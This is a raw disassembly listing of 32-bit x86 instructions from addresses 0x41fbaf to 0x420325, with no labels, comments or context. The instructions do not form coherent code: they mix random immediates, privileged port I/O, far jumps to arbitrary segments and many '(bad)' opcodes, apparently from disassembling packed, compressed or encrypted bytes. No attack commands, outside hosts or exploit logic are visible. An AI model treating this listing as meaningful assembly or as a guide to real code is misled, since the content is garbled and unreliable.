  41fbaf:	jmp    0x274a:0xa1b87104
  41fbb6:	sbb    eax,0xbaea4eef
  41fbbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbbc:	sbb    BYTE PTR [ebx+eiz*4],0x4c
  41fbc0:	aas    
  41fbc1:	lahf   
  41fbc2:	arpl   WORD PTR ds:0xa5db2c00,cx
  41fbc8:	jge    0x41fc31
  41fbca:	lahf   
  41fbcb:	mov    ah,BYTE PTR [eax]
  41fbcd:	and    ebx,DWORD PTR [edi-0x3e]
  41fbd0:	mov    dl,cl
  41fbd2:	xor    BYTE PTR [ebp-0x9],ah
  41fbd5:	rcl    ah,0xc0
  41fbd8:	pushf  
  41fbd9:	in     eax,0x10
  41fbdb:	imul   ebp,DWORD PTR ss:[edx+0x3159382],0x0
  41fbe3:	add    BYTE PTR [esi],al
  41fbe5:	jl     0x41fbe5
  41fbe7:	jecxz  0x41fc48
  41fbe9:	jmp    FWORD PTR [edi]
  41fbeb:	arpl   WORD PTR [esi+0x7b7e6ef7],ax
  41fbf1:	leave  
  41fbf2:	xchg   ebx,eax
  41fbf3:	xchg   BYTE PTR [eax],cl
  41fbf5:	jae    0x41fbd0
  41fbf7:	pop    edi
  41fbf8:	and    eax,0x6d734516
  41fbfd:	push   cs
  41fbfe:	aas    
  41fbff:	icebp  
  41fc00:	popa   
  41fc01:	arpl   WORD PTR ds:[edi+0x78],cx
  41fc05:	jo     0x41fc27
  41fc07:	aad    0xd
  41fc09:	mov    DWORD PTR [esi+0x5a],esp
  41fc0c:	iret   
  41fc0d:	into   
  41fc0e:	outs   dx,BYTE PTR ds:[esi]
  41fc0f:	loopne 0x41fc7a
  41fc11:	in     al,dx
  41fc12:	aam    0xeb
  41fc14:	add    edi,edx
  41fc16:	mov    edi,0xa45c2497
  41fc1b:	ret    0xc3c2
  41fc1e:	fdiv   DWORD PTR [ebx]
  41fc20:	mov    bh,dl
  41fc22:	(bad)  ds:0x1c244d62
  41fc28:	inc    edx
  41fc29:	sub    DWORD PTR [eax-0x479dbced],0x7d0f7161
  41fc33:	int3   
  41fc34:	das    
  41fc35:	jmp    0x41fc16
  41fc37:	dec    edi
  41fc38:	inc    ebp
  41fc39:	into   
  41fc3a:	dec    edi
  41fc3b:	xor    dl,BYTE PTR [edx]
  41fc3d:	fld    QWORD PTR [ecx]
  41fc3f:	inc    edx
  41fc40:	push   cs
  41fc41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc42:	imul   ebp,DWORD PTR [edi],0x11904107
  41fc48:	jecxz  0x41fc43
  41fc4a:	mov    ah,0xe3
  41fc4c:	outs   dx,BYTE PTR ds:[esi]
  41fc4d:	dec    ebx
  41fc4e:	cmp    dh,0x8f
  41fc51:	into   
  41fc52:	mov    ecx,0x97145059
  41fc57:	push   ebp
  41fc58:	mov    ebp,0xa4a6ed01
  41fc5d:	pushf  
  41fc5e:	leave  
  41fc5f:	repz fistp DWORD PTR ds:[eax]
  41fc63:	push   ecx
  41fc64:	enter  0x908d,0x3e
  41fc68:	sbb    dl,BYTE PTR [esi]
  41fc6a:	dec    ecx
  41fc6b:	cld    
  41fc6c:	(bad)  
  41fc6e:	or     bl,dl
  41fc70:	in     eax,0xca
  41fc72:	or     DWORD PTR [ebp+edi*1+0x41],esp
  41fc76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc77:	mov    ebp,0x5a9574db
  41fc7c:	pop    edi
  41fc7d:	push   ss
  41fc7e:	jmp    0x41fcce
  41fc80:	cmp    eax,DWORD PTR [esi+0x298e02ef]
  41fc86:	push   ds
  41fc87:	and    al,0xfb
  41fc89:	cdq    
  41fc8a:	outs   dx,BYTE PTR ds:[esi]
  41fc8b:	daa    
  41fc8c:	sub    BYTE PTR [ebp-0x17e190e0],0x11
  41fc93:	pop    edx
  41fc94:	adc    cl,BYTE PTR [edi+0x7e]
  41fc97:	fld    QWORD PTR ds:0xb68cf606
  41fc9d:	out    dx,eax
  41fc9e:	sbb    ebp,ecx
  41fca0:	dec    esi
  41fca1:	test   BYTE PTR [edi+0x14],ah
  41fca4:	repnz fimul DWORD PTR [edx]
  41fca7:	outs   dx,BYTE PTR ds:[esi]
  41fca8:	add    eax,0x3722bb10
  41fcad:	mov    bl,0x98
  41fcaf:	sub    dh,BYTE PTR [ebx-0x22]
  41fcb2:	dec    edx
  41fcb3:	mov    al,bh
  41fcb5:	pop    eax
  41fcb6:	adc    edi,DWORD PTR [edi-0x2d0b3110]
  41fcbc:	mov    ch,0x3
  41fcbe:	dec    edx
  41fcbf:	inc    ebp
  41fcc0:	mov    edx,0x38ec43de
  41fcc5:	shl    DWORD PTR [eax],0xd5
  41fcc8:	add    BYTE PTR [ebx-0x11],bh
  41fccb:	dec    ecx
  41fccc:	les    esi,FWORD PTR [ecx]
  41fcce:	mov    cl,0x1d
  41fcd0:	das    
  41fcd1:	xchg   esi,eax
  41fcd2:	xchg   edi,eax
  41fcd3:	sub    al,0x6a
  41fcd5:	dec    ecx
  41fcd6:	outs   dx,BYTE PTR ds:[esi]
  41fcd7:	leave  
  41fcd8:	out    dx,eax
  41fcd9:	xor    bl,dh
  41fcdb:	pop    esi
  41fcdc:	lea    edi,[eax+edi*4-0x376a37a9]
  41fce3:	cmp    al,0xe8
  41fce5:	fwait
  41fce6:	sti    
  41fce7:	ja     0x41fcb9
  41fce9:	mov    ebp,0xc6b39cdc
  41fcee:	cmp    ch,BYTE PTR [ebx-0x77fdba0f]
  41fcf4:	jmp    0x5869:0x702ac4f9
  41fcfb:	fcom   QWORD PTR ds:0xc9d4eb4a
  41fd01:	or     eax,0x743f373f
  41fd06:	xor    al,0xbf
  41fd08:	and    al,0x8b
  41fd0a:	shr    DWORD PTR [ecx+ebp*1-0x6e8bb4b0],0x43
  41fd12:	inc    esp
  41fd13:	bound  ecx,QWORD PTR [edx-0x142b4e4d]
  41fd19:	add    edx,eax
  41fd1b:	adc    DWORD PTR [ecx+eax*8],0xb6dd433c
  41fd22:	add    al,0xb7
  41fd24:	repnz push 0xe21235c5
  41fd2a:	adc    DWORD PTR [edx+0x48],ebp
  41fd2d:	or     ebp,DWORD PTR [edi+0x42231514]
  41fd33:	sub    edx,DWORD PTR [ebp-0x2f]
  41fd36:	das    
  41fd37:	out    0x69,al
  41fd39:	sbb    ch,BYTE PTR [ebx]
  41fd3b:	jecxz  0x41fd09
  41fd3d:	mov    eax,ds:0x6ddc0091
  41fd42:	pop    eax
  41fd43:	sub    BYTE PTR [ecx-0x2c],0x29
  41fd47:	jle    0x41fcfd
  41fd49:	je     0x41fcea
  41fd4b:	sbb    al,0xab
  41fd4d:	ja     0x41fd93
  41fd4f:	mov    WORD PTR ds:0x173f92ba,gs
  41fd55:	cmp    BYTE PTR [eax+0x60a26f24],dh
  41fd5b:	or     dh,0xd9
  41fd5e:	xchg   ebx,eax
  41fd5f:	outs   dx,BYTE PTR ds:[esi]
  41fd60:	scas   eax,DWORD PTR es:[edi]
  41fd61:	cdq    
  41fd62:	mov    ds:0x1c1bebdb,eax
  41fd67:	fwait
  41fd68:	lods   eax,DWORD PTR ds:[esi]
  41fd69:	ror    BYTE PTR [edx+0x7e],0x62
  41fd6d:	mov    ch,0x6c
  41fd6f:	xor    edi,ecx
  41fd71:	test   al,0xe2
  41fd73:	int3   
  41fd74:	std    
  41fd75:	push   esi
  41fd76:	loop   0x41fdea
  41fd78:	mov    al,0x31
  41fd7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd7b:	mov    bl,0xd5
  41fd7d:	jmp    esi
  41fd7f:	imul   esi,DWORD PTR [ecx-0x39c34c4b],0xbe78675b
  41fd89:	jmp    0x41fd88
  41fd8b:	add    eax,0xd04e22e3
  41fd90:	pop    esi
  41fd91:	sub    ch,ah
  41fd93:	out    0x68,al
  41fd95:	xor    al,0x5b
  41fd97:	in     eax,0x88
  41fd99:	xchg   DWORD PTR [edi+edx*8+0x3a],edx
  41fd9d:	pop    ebp
  41fd9e:	icebp  
  41fd9f:	jge    0x41fdd4
  41fda1:	sar    BYTE PTR [ebx+0x2e],1
  41fda4:	mov    esi,0x1c57c3
  41fda9:	iret   
  41fdaa:	dec    esp
  41fdab:	inc    ecx
  41fdac:	mov    edi,0x9ee09364
  41fdb1:	iret   
  41fdb2:	in     eax,0x36
  41fdb4:	sub    BYTE PTR [esp+ebp*1],bh
  41fdb7:	inc    ebp
  41fdb8:	sub    DWORD PTR [esp+ecx*4-0x6b],eax
  41fdbc:	int3   
  41fdbd:	sbb    al,0xc
  41fdbf:	mov    WORD PTR [ebx-0x8a5ecdf],?
  41fdc5:	daa    
  41fdc6:	push   cs
  41fdc7:	mov    cl,0x8a
  41fdc9:	imul   esp,DWORD PTR [esi],0x14
  41fdcc:	mov    DWORD PTR [ebp+0x694fba5f],edi
  41fdd2:	mov    bh,0xc2
  41fdd4:	f2xm1  
  41fdd6:	push   edx
  41fdd7:	adc    DWORD PTR [ecx+0x76],esi
  41fdda:	stc    
  41fddb:	loop   0x41fde6
  41fddd:	cmp    esi,0x43
  41fde0:	loope  0x41fda1
  41fde2:	mov    cl,0xb9
  41fde4:	call   DWORD PTR [edx]
  41fde6:	dec    ebx
  41fde7:	push   edi
  41fde8:	mul    BYTE PTR [ecx]
  41fdea:	add    BYTE PTR [edx+0x3ed73990],ch
  41fdf0:	(bad)  
  41fdf1:	jo     0x41fe71
  41fdf3:	in     eax,dx
  41fdf4:	psllw  mm4,mm5
  41fdf7:	leave  
  41fdf8:	mov    ecx,0x445fd709
  41fdfd:	cmp    ebp,0xffffff83
  41fe00:	mov    esi,fs
  41fe02:	add    dh,BYTE PTR [eax]
  41fe04:	cmp    ebx,DWORD PTR [eax]
  41fe06:	fadd   DWORD PTR [ecx]
  41fe08:	pop    edx
  41fe09:	xchg   edx,eax
  41fe0a:	sti    
  41fe0b:	stos   DWORD PTR es:[edi],eax
  41fe0c:	out    0xff,al
  41fe0e:	xchg   esi,eax
  41fe0f:	sti    
  41fe10:	sub    BYTE PTR [ebx],al
  41fe12:	pop    ebp
  41fe13:	mov    ah,0x3a
  41fe15:	pop    edx
  41fe16:	mov    eax,ds:0x3d1c6274
  41fe1b:	sbb    eax,0x122708d
  41fe20:	inc    esi
  41fe21:	addr16 sub eax,0x11928356
  41fe27:	inc    ebp
  41fe28:	sub    DWORD PTR [ebx],edi
  41fe2a:	dec    esi
  41fe2b:	dec    ebp
  41fe2c:	test   eax,esi
  41fe2e:	dec    ecx
  41fe2f:	jo     0x41fdfe
  41fe31:	push   es
  41fe32:	dec    edx
  41fe33:	xchg   ebp,eax
  41fe34:	cld    
  41fe35:	jmp    0x5b343284
  41fe3a:	arpl   WORD PTR [edi-0x6f],ax
  41fe3d:	loopne 0x41fe5e
  41fe3f:	mov    bl,0xb8
  41fe41:	sub    cl,BYTE PTR [edi-0x34598f8c]
  41fe47:	in     al,dx
  41fe48:	outs   dx,DWORD PTR ds:[esi]
  41fe49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe4a:	xchg   esp,eax
  41fe4b:	lea    ebx,[esi-0x64dcfab9]
  41fe51:	or     eax,0x90667e6a
  41fe56:	pop    es
  41fe57:	nop
  41fe58:	pusha  
  41fe59:	jg     0x41fe7a
  41fe5b:	ins    DWORD PTR es:[edi],dx
  41fe5c:	lock add BYTE PTR [edx],dh
  41fe5f:	push   ecx
  41fe60:	jne    0x41fed0
  41fe62:	outs   dx,BYTE PTR ds:[esi]
  41fe63:	loope  0x41fe16
  41fe65:	shl    DWORD PTR [ecx],cl
  41fe67:	add    esi,esi
  41fe69:	pop    ebp
  41fe6a:	pop    ds
  41fe6b:	scas   eax,DWORD PTR es:[edi]
  41fe6c:	std    
  41fe6d:	iret   
  41fe6e:	aaa    
  41fe6f:	sti    
  41fe70:	sbb    al,0xd
  41fe72:	push   ds
  41fe73:	push   ebp
  41fe74:	scas   eax,DWORD PTR es:[edi]
  41fe75:	sbb    BYTE PTR [eax],bh
  41fe77:	js     0x41fe28
  41fe79:	test   al,0x18
  41fe7b:	pop    ebp
  41fe7c:	xor    BYTE PTR [esi],bl
  41fe7e:	or     DWORD PTR [ebx-0x731d4401],esi
  41fe84:	ins    DWORD PTR es:[edi],dx
  41fe85:	cmc    
  41fe86:	repz or ebp,ecx
  41fe89:	enter  0x641c,0xc7
  41fe8d:	aas    
  41fe8e:	sub    cl,BYTE PTR [ebp+0x1d]
  41fe91:	adc    eax,0x3aef2eed
  41fe96:	mov    ecx,0x86db906d
  41fe9b:	push   ss
  41fe9c:	and    edx,DWORD PTR [edx-0x30bdd7]
  41fea2:	sub    ch,BYTE PTR [ebx-0x3c]
  41fea5:	imul   ebp,DWORD PTR [eax*2-0x291b3c18],0xffffff8c
  41fead:	pop    eax
  41feae:	sub    cl,BYTE PTR [edi-0x4362c4a8]
  41feb4:	and    al,0xd6
  41feb6:	xchg   ebp,eax
  41feb7:	push   esp
  41feb8:	jmp    0x41fe3b
  41feba:	int    0xcf
  41febc:	mov    edx,0xf7333b2d
  41fec1:	fld    TBYTE PTR [edx-0x57743efc]
  41fec7:	mov    ecx,0x6f914ef4
  41fecc:	dec    ecx
  41fecd:	xor    esi,DWORD PTR [edi+ebx*1+0x51661f3c]
  41fed4:	hlt    
  41fed5:	arpl   WORD PTR [esi+0x5c9816e8],di
  41fedb:	add    bh,BYTE PTR [edx+0x211b39fa]
  41fee1:	mov    bh,0xba
  41fee3:	lock or DWORD PTR [esi-0x13],0xffffffdc
  41fee8:	mov    bl,0xb4
  41feea:	mov    ebx,DWORD PTR [ebx-0x25]
  41feed:	mov    ss:0x9503f4b3,al
  41fef3:	outs   dx,BYTE PTR ds:[esi]
  41fef4:	(bad)  [edx-0xc]
  41fef7:	jmp    0x41fee6
  41fef9:	sub    ah,BYTE PTR [edi-0x3d]
  41fefc:	add    edx,DWORD PTR [ecx]
  41fefe:	jno    0x41fef2
  41ff00:	lods   eax,DWORD PTR ds:[esi]
  41ff01:	or     eax,0xc02ce3a4
  41ff06:	jmp    0x6e15:0x52863da0
  41ff0d:	cmc    
  41ff0e:	xor    ch,BYTE PTR [esi+0x4b]
  41ff11:	xchg   edx,eax
  41ff12:	sar    BYTE PTR ds:0x2f7cc3bb,1
  41ff18:	popf   
  41ff19:	push   esi
  41ff1a:	jb     0x41febc
  41ff1c:	scas   al,BYTE PTR es:[edi]
  41ff1d:	jl     0x41ff2c
  41ff1f:	xchg   edx,eax
  41ff20:	jg     0x41ff66
  41ff22:	lds    esi,FWORD PTR [esi]
  41ff24:	mov    ds:0xfd504a21,eax
  41ff29:	push   esi
  41ff2a:	jp     0x41fee9
  41ff2c:	fst    DWORD PTR [esi-0x55b4813f]
  41ff32:	jmp    0x2800:0x5330b90e
  41ff39:	jne    0x41feed
  41ff3b:	fst    QWORD PTR [ebp+0x7]
  41ff3e:	fs int 0xc0
  41ff41:	call   0x57ba:0xc8b878d9
  41ff48:	scas   eax,DWORD PTR es:[edi]
  41ff49:	xor    al,0x3d
  41ff4b:	mov    bh,0x23
  41ff4d:	sub    DWORD PTR [ebx+0x57],edi
  41ff50:	mov    ch,BYTE PTR [eax+0x35df49a9]
  41ff56:	or     al,0xb7
  41ff58:	xor    dh,BYTE PTR [ecx]
  41ff5a:	(bad)  
  41ff5c:	and    BYTE PTR [eax-0x64],bh
  41ff5f:	arpl   WORD PTR [edx-0x3ba00dc2],di
  41ff65:	stos   BYTE PTR es:[edi],al
  41ff66:	adc    edi,DWORD PTR [eax+0x65]
  41ff69:	test   DWORD PTR [ebx+0x32],edi
  41ff6c:	sbb    eax,0xb238acd5
  41ff71:	cmp    DWORD PTR fs:[eax],ebp
  41ff74:	inc    edi
  41ff75:	mov    edx,0xe34b5841
  41ff7a:	and    eax,0x692f0658
  41ff7f:	pop    ecx
  41ff80:	shr    DWORD PTR [ebp-0x59],0x59
  41ff84:	pop    ebx
  41ff85:	xchg   edi,eax
  41ff86:	xchg   ebx,eax
  41ff87:	push   0x616ec7af
  41ff8c:	unpckhps xmm3,XMMWORD PTR [eax]
  41ff8f:	dec    dx
  41ff91:	dec    esi
  41ff92:	scas   eax,DWORD PTR es:[edi]
  41ff93:	cmp    DWORD PTR [edi],edx
  41ff95:	sbb    ah,dh
  41ff97:	adc    al,0x43
  41ff99:	mov    gs,WORD PTR [esi+0x66]
  41ff9c:	sbb    BYTE PTR [ebx+0x78a12c3d],bl
  41ffa2:	mov    al,0x54
  41ffa4:	in     al,0xc9
  41ffa6:	cmc    
  41ffa7:	pop    ebx
  41ffa8:	cdq    
  41ffa9:	pop    eax
  41ffaa:	xor    BYTE PTR [edi+0x7f6a7eb9],cl
  41ffb0:	jbe    0xc72a4a6a
  41ffb6:	xchg   esi,eax
  41ffb7:	test   al,0xae
  41ffb9:	lods   eax,DWORD PTR ds:[esi]
  41ffba:	xor    al,0xaa
  41ffbc:	jo     0x41ffa5
  41ffbe:	mov    WORD PTR [eax+0x72],ds
  41ffc1:	imul   esi,DWORD PTR [eax-0x52],0x79531073
  41ffc8:	cmp    eax,edi
  41ffca:	adc    edi,ebx
  41ffcc:	repz or DWORD PTR [eax],ebx
  41ffcf:	fs or  bl,dl
  41ffd2:	mov    ebp,DWORD PTR [edi-0x6b]
  41ffd5:	mov    ecx,0x107ccc
  41ffda:	sub    eax,0x6a0d5675
  41ffe0:	outs   dx,DWORD PTR ds:[esi]
  41ffe1:	sbb    ch,ch
  41ffe3:	nop
  41ffe4:	mov    al,0x29
  41ffe6:	jnp    0x42002f
  41ffe8:	mov    ds:0xad161063,eax
  41ffed:	mov    cs,WORD PTR ds:0x8a1659ca
  41fff3:	in     eax,0x65
  41fff5:	jl     0x41ff90
  41fff7:	retf   0xfa16
  41fffa:	stc    
  41fffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fffc:	dec    al
  41fffe:	fs mov bh,0x66
  420001:	out    dx,al
  420002:	jl     0x41fff9
  420004:	hlt    
  420005:	fnstsw WORD PTR [ebp+0x5ce089dc]
  42000b:	scas   eax,DWORD PTR es:[edi]
  42000c:	pop    ss
  42000d:	mov    ecx,DWORD PTR [ebp-0x22]
  420010:	mov    ebp,0x387adae3
  420015:	jmp    0x42002e
  420017:	pop    ebx
  420018:	jns    0x41ffaf
  42001a:	pusha  
  42001b:	jp     0x42000d
  42001d:	pusha  
  42001e:	cmp    BYTE PTR [ecx],cl
  420020:	out    dx,al
  420021:	pushf  
  420022:	int3   
  420023:	scas   eax,DWORD PTR es:[edi]
  420024:	sub    edi,ebx
  420026:	je     0x41ffe0
  420028:	pop    es
  420029:	xchg   edx,eax
  42002a:	inc    esp
  42002b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42002c:	push   cs
  42002d:	fist   DWORD PTR [edx+0x79]
  420030:	aaa    
  420031:	push   cs
  420032:	jge    0x420012
  420034:	or     ebp,eax
  420036:	ror    BYTE PTR [edi+0x6d],0x99
  42003a:	add    eax,0xbe8bed19
  42003f:	(bad)  [ebp-0x80]
  420042:	sub    al,0xbd
  420044:	jge    0x42000d
  420046:	push   cs
  420047:	js     0x4200c2
  420049:	in     eax,dx
  42004a:	mov    al,0x99
  42004c:	inc    edx
  42004d:	mov    bh,BYTE PTR [esi]
  42004f:	inc    edi
  420050:	daa    
  420051:	sbb    eax,0x70afba91
  420056:	aas    
  420057:	dec    eax
  420058:	mov    WORD PTR [esi+0x249f8460],fs
  42005e:	sub    BYTE PTR ds:0x18bee499,dl
  420064:	pop    ebx
  420065:	ret    
  420066:	and    BYTE PTR es:[edx],ah
  420069:	jp     0x420020
  42006b:	enter  0x2a16,0x6a
  42006f:	cmp    edx,DWORD PTR [ebp+0x3d459018]
  420075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420076:	xor    eax,0xf8dc3713
  42007b:	test   eax,0x2cbdfc4b
  420080:	xchg   ebp,eax
  420081:	sbb    al,BYTE PTR [ecx+0x446b713a]
  420087:	xlat   BYTE PTR ds:[ebx]
  420088:	mov    al,ds:0x6b55916e
  42008d:	cmc    
  42008e:	into   
  42008f:	pop    ss
  420090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420091:	push   cs
  420092:	dec    edi
  420093:	inc    ebp
  420094:	jo     0x42005c
  420096:	and    esi,DWORD PTR [ebp-0x1d7490ff]
  42009c:	inc    ecx
  42009d:	jno    0x4200b0
  42009f:	out    dx,al
  4200a0:	clc    
  4200a1:	cwde   
  4200a2:	adc    BYTE PTR [edx],bl
  4200a4:	outs   dx,BYTE PTR ds:[esi]
  4200a5:	pop    ss
  4200a6:	mov    esp,ebx
  4200a8:	and    BYTE PTR [eax],ch
  4200aa:	or     edi,esp
  4200ac:	mov    dh,0x1d
  4200ae:	retf   
  4200af:	push   cs
  4200b0:	sub    al,0xb
  4200b2:	fdivr  QWORD PTR [esi]
  4200b4:	popf   
  4200b5:	mov    BYTE PTR [ecx-0x1499af8f],dh
  4200bb:	inc    edi
  4200bc:	inc    esi
  4200bd:	aam    0x87
  4200bf:	(bad)  [edx+0x51749aac]
  4200c5:	retf   0x1db8
  4200c8:	push   0x9436fe39
  4200cd:	js     0x420055
  4200cf:	fs gs inc edi
  4200d2:	xor    eax,0x51feac27
  4200d7:	dec    esi
  4200d8:	pop    edi
  4200d9:	inc    ebx
  4200da:	loopne 0x420094
  4200dc:	shr    BYTE PTR [ebp-0x7e93a7bd],1
  4200e2:	ins    DWORD PTR es:[edi],dx
  4200e3:	je     0x420073
  4200e5:	outs   dx,BYTE PTR ds:[esi]
  4200e6:	dec    eax
  4200e7:	loop   0x4200ca
  4200e9:	cmp    BYTE PTR [esi+0x790f054e],cl
  4200ef:	scas   al,BYTE PTR es:[edi]
  4200f0:	and    DWORD PTR [edi+0x18c80da4],esp
  4200f6:	sbb    al,bh
  4200f8:	xor    BYTE PTR ds:0x472fbc36,bl
  4200fe:	int3   
  4200ff:	lds    edi,FWORD PTR [ebx+0x4d]
  420102:	and    al,0xd8
  420104:	pop    ds
  420105:	rol    BYTE PTR [ecx+0x42],cl
  420108:	(bad)  
  420109:	mov    bh,0xec
  42010b:	or     DWORD PTR [ecx+eiz*2],0xc
  42010f:	daa    
  420110:	loope  0x42015a
  420112:	cld    
  420113:	out    dx,al
  420114:	ja     0x4200a8
  420116:	cmp    eax,DWORD PTR ds:0x50fbb0f8
  42011c:	(bad)  
  42011d:	ds bnd jg 0x42011a
  420121:	data16 rol BYTE PTR [edx+ecx*4-0xc09233f],1
  420129:	add    al,0x47
  42012b:	cmc    
  42012c:	jo     0x42015f
  42012e:	(bad)  
  420130:	add    BYTE PTR [ecx-0x58],dl
  420133:	neg    BYTE PTR [ecx-0x1496f567]
  420139:	leave  
  42013a:	shl    BYTE PTR [edi+ecx*8+0xdb539f7],1
  420141:	enter  0x35a6,0x2b
  420145:	jb     0x420135
  420147:	std    
  420148:	push   esi
  420149:	into   
  42014a:	mov    ebx,0xe48edeb7
  42014f:	cld    
  420150:	sbb    eax,0x8f3cb91a
  420155:	and    eax,0xa83d2e39
  42015a:	fcomp  QWORD PTR [ecx+0x0]
  42015d:	or     eax,0x9474930c
  420162:	sub    edx,edx
  420164:	push   eax
  420165:	jno    0x4200fc
  420167:	sar    DWORD PTR [ecx-0xe],cl
  42016a:	repz push edx
  42016c:	inc    ebp
  42016d:	xchg   ebp,eax
  42016e:	inc    edi
  42016f:	add    al,ch
  420171:	nop
  420172:	jbe    0x4201e3
  420174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420175:	scas   al,BYTE PTR es:[edi]
  420176:	mov    cl,0x11
  420178:	mov    al,0xe9
  42017a:	xchg   BYTE PTR ds:0x1245afdc,bh
  420180:	std    
  420181:	or     eax,DWORD PTR ds:0x3dc03bcd
  420187:	and    BYTE PTR [ecx-0x50],bh
  42018a:	xchg   ebx,eax
  42018b:	xor    al,0x34
  42018d:	xchg   ecx,eax
  42018e:	add    DWORD PTR [esi],0x8f08ac69
  420194:	sbb    ah,BYTE PTR [ecx+eax*4]
  420197:	repz fisttp DWORD PTR [esi-0x6a82e5d5]
  42019e:	rcl    cl,cl
  4201a0:	mov    edx,0xa40c7443
  4201a5:	test   eax,0x3f5621a1
  4201aa:	mov    ds:0x1a683a41,eax
  4201af:	dec    eax
  4201b0:	xchg   esp,eax
  4201b1:	cmp    DWORD PTR [ebp-0x55eb2be2],ebx
  4201b7:	out    dx,eax
  4201b8:	sbb    edx,0xa31ce5b0
  4201be:	dec    esi
  4201bf:	fdivr  QWORD PTR [esi-0x27]
  4201c2:	out    0x1b,eax
  4201c4:	push   ebp
  4201c5:	jae    0x420198
  4201c7:	mov    eax,ds:0xcbc2c6e9
  4201cc:	sti    
  4201cd:	lahf   
  4201ce:	retf   0x54df
  4201d1:	jmp    0x4201b1
  4201d3:	ror    BYTE PTR [ebx],1
  4201d5:	jbe    0x420182
  4201d7:	add    ebp,edx
  4201d9:	aad    0x5
  4201db:	mov    ebx,0x383f56ef
  4201e0:	dec    esi
  4201e1:	jnp    0x42016a
  4201e3:	mov    al,0x64
  4201e5:	jmp    0x420256
  4201e7:	push   eax
  4201e8:	repnz stos DWORD PTR es:[edi],eax
  4201ea:	das    
  4201eb:	or     al,BYTE PTR [edx+0x22135521]
  4201f1:	mov    ecx,0xf7f548e1
  4201f6:	mov    ecx,0xfe9847fc
  4201fb:	jmp    0xa50:0x39af5d22
  420202:	addr16 std 
  420204:	and    esi,eax
  420206:	add    al,0xf0
  420208:	dec    esp
  420209:	das    
  42020a:	call   0xf4980c31
  42020f:	call   0x719b4e18
  420214:	int    0xae
  420216:	fs pop ss
  420218:	push   0xff26c9ba
  42021d:	out    0xff,al
  42021f:	pop    esi
  420220:	fs dec ecx
  420222:	jno    0x42029f
  420224:	aas    
  420225:	rcr    BYTE PTR [eax-0x3ae80c4e],0x8b
  42022c:	test   DWORD PTR [edx-0x5a],ecx
  42022f:	xchg   ecx,eax
  420230:	add    eax,0xc40bdf7b
  420235:	(bad)  
  420236:	pop    ebx
  420237:	jmp    0x18f4:0x5151688d
  42023e:	cwde   
  42023f:	mov    dl,0xba
  420241:	popa   
  420242:	sti    
  420243:	pop    ds
  420244:	jb     0x4202c4
  420246:	add    edi,DWORD PTR [edx]
  420248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420249:	ret    
  42024a:	mov    esi,gs
  42024c:	jp     0x420260
  42024e:	jne    0x420236
  420250:	enter  0xfc3d,0x84
  420254:	mov    ebx,0x391cab1c
  420259:	aam    0xfa
  42025b:	push   ss
  42025c:	div    al
  42025e:	sub    eax,0xab3a3bf0
  420263:	add    al,BYTE PTR [esp+edi*2+0x1d]
  420267:	jecxz  0x420261
  420269:	adc    eax,0xfa278d2f
  42026e:	out    dx,eax
  42026f:	dec    ebx
  420270:	aaa    
  420271:	xor    cl,BYTE PTR [ecx]
  420273:	xchg   ecx,eax
  420274:	mov    esp,0x20f63d74
  420279:	cmc    
  42027a:	cmp    BYTE PTR [eax+ebp*4-0x4bf047ce],bh
  420281:	mov    fs,WORD PTR [bx+0x45]
  420285:	repz mov dh,0x82
  420288:	leave  
  420289:	gs popf 
  42028b:	int3   
  42028c:	aas    
  42028d:	test   BYTE PTR [edx+eax*2-0x3fa0c10e],cl
  420294:	pop    ebx
  420295:	(bad)  
  420297:	mov    DWORD PTR [ebx],edx
  420299:	scas   eax,DWORD PTR es:[edi]
  42029a:	sub    al,0xfc
  42029c:	xchg   edi,eax
  42029d:	mov    ch,0xa5
  42029f:	cmc    
  4202a0:	pop    eax
  4202a1:	dec    ebp
  4202a2:	iret   
  4202a3:	(bad)  
  4202a5:	shr    BYTE PTR [ebx-0x72],0x39
  4202a9:	ds ret 
  4202ab:	mul    BYTE PTR [ecx-0x31]
  4202ae:	(bad)  
  4202b0:	rcr    DWORD PTR [edi+0x13],1
  4202b3:	push   edi
  4202b4:	push   ecx
  4202b5:	je     0x4202a4
  4202b7:	pop    ds
  4202b8:	mov    ds:0x3a6d695,al
  4202bd:	mov    edi,0x5117c9b1
  4202c2:	mov    ch,0x9b
  4202c4:	adc    ecx,ebp
  4202c6:	fs dec edx
  4202c8:	js     0x42028c
  4202ca:	lahf   
  4202cb:	vpmacssdqh xmm9,xmm2,xmm6,xmm4
  4202d1:	scas   eax,DWORD PTR es:[edi]
  4202d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202d3:	xlat   BYTE PTR ds:[ebx]
  4202d4:	leave  
  4202d5:	sti    
  4202d6:	fcomp  DWORD PTR [eax]
  4202d8:	mov    ds:0x3e8b41c6,al
  4202dd:	xchg   DWORD PTR [ebp+0x56ef0ffa],eax
  4202e3:	xchg   ecx,edi
  4202e5:	sbb    DWORD PTR [edi-0x465887bb],ebx
  4202eb:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202ed:	xchg   DWORD PTR [esi+0x3a31d794],esi
  4202f3:	ja     0x42027a
  4202f5:	nop
  4202f6:	pop    ds
  4202f7:	jle    0x4202a8
  4202f9:	xchg   ebp,eax
  4202fa:	inc    BYTE PTR [edi-0x4f]
  4202fd:	cwde   
  4202fe:	mov    eax,ds:0x54d4ab6d
  420303:	push   ss
  420304:	cli    
  420305:	leave  
  420306:	inc    edi
  420307:	sub    ah,BYTE PTR [edi]
  420309:	repz mov dl,0x88
  42030c:	and    BYTE PTR [ecx],bh
  42030e:	out    0x68,al
  420310:	xchg   ebx,eax
  420311:	mov    ds:0x2b8e49c6,al
  420316:	retf   0x7543
  420319:	sub    esi,DWORD PTR [edx+0x735ead01]
  42031f:	dec    ebp
  420320:	icebp  
  420321:	cmp    DWORD PTR [ebx-0x16],eax
  420324:	dec    ecx
  420325:	pop    ebp
